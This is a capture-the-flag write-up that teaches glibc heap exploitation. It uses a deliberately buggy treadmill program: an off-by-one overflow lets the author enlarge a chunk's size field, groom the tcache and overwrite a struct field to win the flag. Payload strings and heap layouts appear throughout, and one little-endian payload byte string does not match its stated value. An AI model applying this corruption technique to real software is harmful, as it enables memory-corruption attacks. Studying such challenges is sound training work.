Some weeks ago I participated in the Potsdam Cyber Games. As the challenge Gym
2 is a nice introductory heap exploitation challenge, I thought that writing a
blog post about it could be helpful for people who are getting into glibc heap
exploitation.

You can find all given files of the challenge as well as my exploit in my [github repository](https://github.com/c1bero/potsdam-cyber-games-2024/tree/main/gym2).

We are given the source code `treadmill.c` and hence, we do not have to reverse
engineer any binaries in this challenge.

## First analysis of the program

Let's first take a look what the program is intended to do:
```
$ ./treadmill
Tilty the treadmill trainer.
Today's highscore is 133713376942 points by Perry the Platypwny.
[1] Start new training
[2] Exit
>
```

Okay, it seems that we have some kind of a highscore, we can start a training
and exit. Let's dive deeper into the training:
```
$ ./treadmill
Tilty the treadmill trainer.
Today's highscore is 133713376942 points by Perry the Platypwny.
[1] Start new training
[2] Exit
> 1
Welcome to your treadmill training. Ready to beat Perry the Platypwny?
But first, tell me your name
> pwner
Nice to meet you, pwner
What do you want to do:

[1] Create a training plan
[2] List training plans
[3] Delete a training plan
[4] Train
[5] Stop training
```

First of all, we have to enter our name. Afterwards, we have different options
which look typical for a heap exploitation challenge since creating a training
plan probably will allocate memory on the heap while deleting a training plan
probably frees the allocated memory.
Additionally, we can list training plans and execute our training.

### Creating a training plan

When we create a training plan, we have to enter a name and six pitches:
```
[1] Create a training plan
[2] List training plans
[3] Delete a training plan
[4] Train
[5] Stop training
> 1
Please give your plan a name.
> power_training
How should it look like? Please enter 6 pitches.
Please provide pitch #1 / 6
> 1
Please provide pitch #2 / 6
> 2
Please provide pitch #3 / 6
> 3
Please provide pitch #4 / 6
> 4
Please provide pitch #5 / 6
> 5
Please provide pitch #6 / 6
> 6
The number of your plan: 0
```

Afterwards, the index of our created training is returned which is `0` in this
case.

### Executing the training

Now that we have created a training, let's show some performance and execute our
training:
```
[1] Create a training plan
[2] List training plans
[3] Delete a training plan
[4] Train
[5] Stop training
> 4
Please enter the number of your training plan.
> 0
Good choice!
You need to train for 120 seconds.
Now setting to pitch 1.000000.
Now setting to pitch 2.000000.
Now setting to pitch 3.000000.
Now setting to pitch 4.000000.
Now setting to pitch 5.000000.
Now setting to pitch 6.000000.
Wow! That was pretty good.
```

Uhhh, our training takes 120 seconds... If we stop our training, we can see that
our score is `1`:
```
[1] Create a training plan
[2] List training plans
[3] Delete a training plan
[4] Train
[5] Stop training
> 5
Your score: 1
Tilty the treadmill trainer.
Today's highscore is 133713376942 points by Perry the Platypwny.
```

It is a valid guess to say that a training takes a lot of time while it only
improves our score by a small number. Hence, beating the highscore by playing
the rules would take forever. But who needs rules?

### Goal

After getting a first idea of the program let's think about our ultimate goal
here and inspect `treadmill.c` in more detail. Let's take a look at the two
functions `print_reward()` and `change_highscore()`:

```c
static void print_reward() {
    const char *flag = getenv("FLAG");
    if (!flag) {
        printf("FLAG is missing.\n");
        return;
    }

    printf("Wow! You reached a new high score. Take this as little reward and present it at the gala dinner: %s\n", flag);
}

static void change_highscore(char *name, size_t score) {
    highscore_t *new_high_score = malloc(sizeof(new_high_score));
    new_high_score->name = name;
    new_high_score->score = score;
    highscore = new_high_score;
    print_reward();
}
```

We probably have to beat the highscore such that the function
`change_highscore()` is called since it calls the function `print_reward()`
which gives us the flag!  Therefore, we do not need to pop a shell in this
challenge. We only have to find a way to beat the highscore without training
for years.


## Implementation

Now, let's find some bugs and understand how the code is working.

### Data structures

There are three main structs which are used, these are `training_plan_t`,
`trainee_t`, and `highscore_t`:
```c
typedef struct training_plan {
    double pitches[NUM_PITCHES];
    size_t trainings;
    char *name;
    struct training_plan *next;
} training_plan_t;

typedef struct trainee {
    char *name;
    training_plan_t *training_plans;
} trainee_t;

typedef struct highscore {
    char *name;
    size_t score;
} highscore_t;
```

### Creating a training plan

The implementation of the creation of a training plan reveals that memory on
the heap is allocated two times, this is for the struct `training_plan_t` and
the member `name` of the struct `training_plan_t`:

```c
            printf("Please give your plan a name.\n> ");
            if (fgets(buffer, sizeof(buffer), stdin) == NULL || feof(stdin)) {
                continue;
            }
            name_len = strlen(buffer);
            while (name_len > 0 && buffer[name_len - 1] == '\n') {
                buffer[name_len - 1] = '\0';
                name_len = strlen(buffer);
            }

            name = malloc(name_len - 1); // [1]
            if (name == NULL) {
                perror("malloc");
                return;
            }

            training_plan_t *plan = (training_plan_t*)malloc(sizeof(training_plan_t)); // [2]
            if (plan == NULL) {
                perror("malloc");
                return;
            }
            plan->name = name;
            plan->next = NULL;
            plan->trainings = 0;

            memcpy(plan->name, buffer, name_len); // [3]
            plan->name[name_len] = '\0';

            printf("How should it look like? Please enter 6 pitches.\n");
            for (size_t i = 0; i < NUM_PITCHES; ++i) {
                printf("Please provide pitch #%zu / %llu\n> ", i + 1, NUM_PITCHES);
                fgets(buffer, sizeof(buffer), stdin);
                plan->pitches[i] = strtod(buffer, NULL);
            }
            // Append plan.
            size_t i = 0;
            if (trainee->training_plans == NULL) {
                trainee->training_plans = plan;
            } else {
                training_plan_t *previous_plan = trainee->training_plans;
                ++i;
                while (previous_plan->next != NULL) {
                    previous_plan = previous_plan->next;
                    ++i;
                }
                previous_plan->next = plan;
            }
            printf("The number of your plan: %zu\n", i);
```

First, we can determine the name of our training plan which is copied via
`fgets()` into the `2048` bytes large array called `buffer`.
Then, the length of our input string is computed and saved in `name_len`.

Afterwards, in line `11` (marked with `[1]`) we can see that memory for
`name_len - 1` instead of `name_len + 1` bytes is allocated!  Remember that
strings in C end with a null byte and hence, one has to allocate one more byte
than the length of the string. However, the programmer must have mixed up the
`+` and `-` keys. Consequently, two bytes too few are allocated for `name`.

Then, in line `17` (marked with `[2]`) memory for our `training_plan_t` struct
`plan` is allocated. In particular, the member `plan->name` is set to our
allocated `name` buffer in line `22`.

In line `26` (marked with `[3]`), `memcpy()` is called  and `name_len` bytes
are copied from our controlled `buffer` into the newly allocated `name` buffer.
As we only allocated `name_len - 1` bytes but copied `name_len` bytes, we have
a heap buffer overflow by one byte.  Moreover, `plan->name[name_len]` is set to
`'\0'` to end the string with a null byte in line `27`.  Therefore, we have a
heap buffer overflow by two bytes but can only control one of these two
overflowable bytes.

In the end, the new training plan is appended to the linked list of training
plans.

Next, let's inspect how the allocated chunks of memory look like on the heap
and create two training plans with the names `"AAAAAAAA"` and
`"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"`. I am using `gdb` with the plugin
[pwndbg](https://github.com/scwuaptx/Pwngdb/tree/master/pwndbg). To make
debugging easier I add the flag `-g` in the Makefile and rebuild the binary
`treadmill`. Then I set a breakpoint in `gdb` at `treadmill.c:99` such that the
breakpoint is hit each time the menu is shown:

```
$ gdb treadmill

```

The command `vis` can be used to visualize the heap. What can be seen here?
![Alt Text](/assets/images/gym2_heap_two_chunks.png)

The yellow chunk contains our first `training_plan_t` struct whose `char *name` member
is marked by the red block and points to the blue chunk which was explicitly
allocated for the training plan name we entered. In particular, we can see the
name `"AAAAAAAA"` inside the blue block whose hex representation is
`0x4141414141414141`. Let us note that the first 8 bytes of a chunk give us
information about the size of the chunk. In this case the blue chunk starts with
`0x21` and hence, the blue chunk consists of `0x20` bytes.
The yellow chunk starts with `0x51` and therefore, the yellow chunk consists of
`0x50` bytes.

Similarly, the purple chunk is `0x50` bytes large as this is the
`training_plan_t` struct with the name `"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"` and
the size of the struct `training_plan_t` is constant. In contrast to the blue
chunk for the name `"AAAAAAAA"` with the size `0x20`, we need a larger chunk
for the name `"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"` which is the turquoise chunk
with a size of `0x30`.

Let us recall the definition of the struct `training_plan_t`:
```c
typedef struct training_plan {
    double pitches[NUM_PITCHES];
    size_t trainings;
    char *name;
    struct training_plan *next;
} training_plan_t;
```

We can see that the first six 8-btye-blocks in the yellow/purple chunk after the
size field `0x51` describe the `pitches[NUM_PITCHES]` array as
`NUM_PITCHES = 6`. After these six entries the value of `trainings` is written
which is zero in our case since we have not trained yet. Our ultimate goal is to
have a `trainings` value that is larger than the current highscore which is
`133713376942`.

What happens if we delete a training plan? Let's find out:

The chunk for the name `"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"` as well as its
corresponding `training_plan_t` chunk have been freed. The name chunk of size
`0x30` was added to the `tcachebins[0x30]` linked list and the
`training_plan_t` chunk of size `0x50` to the `tcachebins[0x50]` linked list.
If we want to allocate a new chunk of size `0x50`, the chunk of the
`tcachebins[0x50]` list is used first before new memory on the heap is
allocated.

## Development of an exploit

Let's summarize what we have found out so far:
* When we create a new training plan, a chunk for the training plan name is
	allocated first and afterwards, a chunk for the `training_plan_t` struct is
	allocated.
* After allocating these two chunks, our entered training plan name is copied
	from `buffer` to `plan->name`.
* A training plan name is overflowable by two bytes where we can control the
	first overflowable byte and the second one is always set to `'\0'`.
* The size of a `training_plan_t` chunk is always `0x50` bytes.
* The size of a training plan name depends on the length of our entered
	training plan name.
* The value `trainings` of a `training_plan_t` struct is the eigth 8-byte-block
	in the corresponding `training_plan_t` chunk (including the size field). If the
	value of `trainings` is larger than `133713376942`, we have beaten the
	highscore and thus, we have won and receive the flag.

How do we get a large `trainings` value without
executing our training?

The basic idea is the following:
* Use the off-by-one heap overflow to overwrite the size field of the next
	chunk on the heap (let us call the chunk victim chunk whose size field is
	modified).
	In particular, edit the size field of the victim chunk such that it is
	increased. For example, let's say the victim chunk has the size `0x50`. Then,
	we overwrite the first value of the victim chunk, which is `0x51`, by `0x91`.
* Afterwards, we free the victim chunk. As the size field was changed from `0x51`
	to `0x91`, the free chunk is not added to the `tcachebins[0x50]` but to the
	`tcachebins[0x90]` list.
* Then, we allocate a name chunk with the size `0x90` and get the victim chunk
	back from the `tcachebins[0x90]` list.
* However, remember that the real size of the victim chunk was only `0x50` bytes.
	Hence, we have an overflow of `0x90 - 0x50 = 0x40` bytes now.
* The idea is to use this increased overflow to overwrite the members of an
	adjacent chunk of the victim chunk which would be a `training_plan_t` chunk
	in the ideal case. In this case, we could overwrite the `trainings` member and
	beat the highscore.

This can be done as follows:
* First, create a training plan with the name `"A"*0x48 + "\x91"`.
	* This results in two `0x50` chunks, the first one for the training name and
		the second one for the `training_plan_t` struct.
	* As the name chunk was allocated first and our entered name `"A"*0x48 +
		"\x91"` is written to this chunk only after the `training_plan_t` chunk was
		allocated, we overwrite the size field of the `training_plan_t` chunk. Hence,
		its size field `0x51` is replaced by `0x91`.
	* On the visualization of the heap can be seen that the coloring is confused
		as we have corrupted the heap. Hence, I surrounded the `training_plan_t` chunk
		with yellow lines. The overwritten size field is marked by a red rectangle:
		![Alt Text](/assets/images/gym2_sploit_1.png)
* As we will overflow this yellow chunk at a later stage of this exploit, we
	have to build the structure of the heap in such a way that the chunk after the
	yellow chunk is a `training_plan_t` chunk.
	* Hence, we first create a training with the name `"B"*0x40`:
		![Alt Text](/assets/images/gym2_sploit_2.png)
	* Next, we delete this training again:
		![Alt Text](/assets/images/gym2_sploit_3.png)
		It can be seen, that there are two free chunks in the `tcachebins[0x50]`
		list now. If a new training plan is created with a name of (for example)
		`0x200` bytes, a chunk of the `tcachebins[0x50]` list is taken for the
		`training_plan_t` struct and a new chunk is allocated for the large name with
		`0x200` bytes.
* Let's create two new training plans with the name `"C"*0x200` and
	`"D"*0x200`. Here you can see an excerpt of the heap:
	![Alt Text](/assets/images/gym2_sploit_4.png)

	Please note that we achieved our goal which was placing a `training_plan_t`
	chunk after the modified chunk with the overwritten size field `0x91`.
* Now, we delete the training plan which has a modified chunk:
	![Alt Text](/assets/images/gym2_sploit_5.png)
	* Great, we see that the chunk, which is marked with yellow lines, consists
		of 0x50 bytes but was added to the `tcachebins[0x90]` list due to its
		overwritten size field (red rectangles).
	* After this chunk there is the `training_plan_t` chunk for the training plan
		with the name `"C"*0x200"`. The `trainings` value of this training plan is
		marked by an orange rectangle in the screenshot above.
	* Our next and final goal is to overwrite the orange field with
		`133713376942 + 1` to beat the highscore.
* Finally, we create a training plan with the following name: `"E"*8*16 + "\xfa36f0211f"`:
	* The last value `"\xfa36f0211f"` is `133713376942 + 1 = 0x1f21f036af` in little endian.
	* The size of our name is `8*16 + 8 = 0x88` bytes. As we need additional 8
		bytes to save the size field in our chunk, the total size of our chunk would
		have to be `0x90`. Therefore, we should get the free chunk from the
		`tcachebins[0x90]` list for our name chunk.
	* Let's take a look in gdb:
		![Alt Text](/assets/images/gym2_sploit_6.png)

		Yeah, we have overwritten the trainings field, which is marked with the
		orange rectangle, exactly with our desired value `0x1f21f036af`!
* If we finish our training, we receive the flag!

    # Finally, create a training plan such that the name chunk requires 0x90

    # Use this overflow to overwrite the trainings value of the training plan
    # with the name "C"*0x200 with the value 0x1f21f036af to beat the highscore.
    recv_menu()

## Conclusion

This challenge shows how a small off-by-one heap overflow can be exploited to
cause a larger heap overflow, allowing an attacker to overwrite heap data and
manipulate sensitive information.
